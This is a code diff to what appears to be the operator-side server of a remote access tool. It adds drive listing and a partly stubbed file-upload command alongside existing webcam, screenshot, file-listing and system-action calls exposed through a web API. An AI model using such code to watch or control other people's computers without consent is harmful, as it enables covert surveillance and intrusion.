@@ -179,7 +179,7 @@ def ControlClient(command, connection):
 def ClientInformation(connection):
    response = send_and_receive(connection, 'ping')
    if not ('ping' in response):
-      return str()
+      return None
 
    for client in clients:
       if (client['connection_id'] == connection):
@@ -218,6 +218,14 @@ def Webcam(connection):
    
    return None
 
+def GetDrives(connection):
+   response = send_and_receive(connection, 'drives')
+   if ('drives' in response):
+      drives = receive(connection)
+      return drives
+   
+   return None
+
 def GetFiles(connection, path):
    response = send_and_receive(connection, 'files')
 
@@ -229,12 +237,48 @@ def GetFiles(connection, path):
          return 'notexist'
       
       send(connection, 'ok')
-      fileSize = int(receive(connection))
+      fileSize = receive(connection)
+
+      if (len(fileSize) < 1):
+         return None
 
       send(connection, 'ok')
-      data = str(receive_all(connection, False, fileSize), 'utf-8')
+      files = str(receive_all(connection, False, int(fileSize)), 'utf-8')
       
-      return data
+      return files
+   
+   return None
+
+def UploadFile(connection, path, fileName, data):
+   response = send_and_receive(connection, 'upload-file')
+
+   if ('upload-file' in response):
+      if (path.startswith('\\') or path.startswith('/')):
+         path = f'C:{path}'
+
+      details = f'{fileName}\n{path}\n{len(data)}'
+      print(details.split('\n'))
+
+      """
+      send(connection, path)
+      receive(connection)
+
+      send(connection, str(len(data)))
+      receive(connection)
+
+      send(connection, fileName)
+      folderState = receive(connection)
+
+      if ('file-creation-failed' in folderState):
+         return False
+
+      send(connection, data)
+      status = receive(connection)
+
+      print(status)
+
+      return True if ('file-uploaded' in status) else False
+      """
    
    return None
    
@@ -322,7 +366,9 @@ webapi.api.SystemAction = SystemAction
 webapi.api.SendMessage = SendMessage
 webapi.api.Screenshot = Screenshot
 webapi.api.Webcam = Webcam
+webapi.api.GetDrives = GetDrives
 webapi.api.GetFiles = GetFiles
+webapi.api.UploadFile = UploadFile
 
 server_thread = threading.Thread(target=start_websocket_server)
 server_thread.daemon = True
